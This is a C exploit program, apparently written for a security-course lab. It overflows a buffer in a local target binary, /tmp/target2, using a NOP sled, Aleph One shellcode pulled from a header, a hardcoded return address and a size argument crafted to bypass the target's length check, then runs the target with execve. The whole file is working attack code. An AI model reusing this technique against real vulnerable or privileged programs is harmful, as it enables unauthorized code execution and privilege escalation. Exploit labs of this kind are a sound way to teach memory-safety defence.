#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

#define BUFFER_SIZE 408

static char addr[] = "\x86\xfb\xff\xbf";

int main(void)
{
  char *args[4]; 
  char buffer[BUFFER_SIZE]; // Make larger size as target program?
  char *env[1];
  
  // Initialize buffer with NOP instructions
  memset(buffer, 0x90, BUFFER_SIZE-4);

  // Copy over shellcode
  memcpy(buffer + 203, shellcodeAlephOne, sizeof(shellcodeAlephOne)-1); // There's a 0 byte at the end of this?!?!
  printf("Size of shellcode AlephOne: %d\n", sizeof(shellcodeAlephOne));

  memcpy(buffer+404, addr, sizeof(addr)-1);
  printf("Size of addr: %d\n", sizeof(addr));

  int real_size = strlen(buffer); // argv[1] in target
  int input_size = atoi("399"); // argv[2] in target
  printf("Real size: %d; input size: %d\n", real_size, input_size);

  args[0] = TARGET; // Must contain filename of file being executed
  args[1] = buffer; // this is what's passed to greeting() // buffer;
  args[2] = "65935"; // this is checked for size. Make it larger than our buffer size
  args[3] = NULL; // argv and envp arrays must each include a null pointer at end of array

  env[0] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


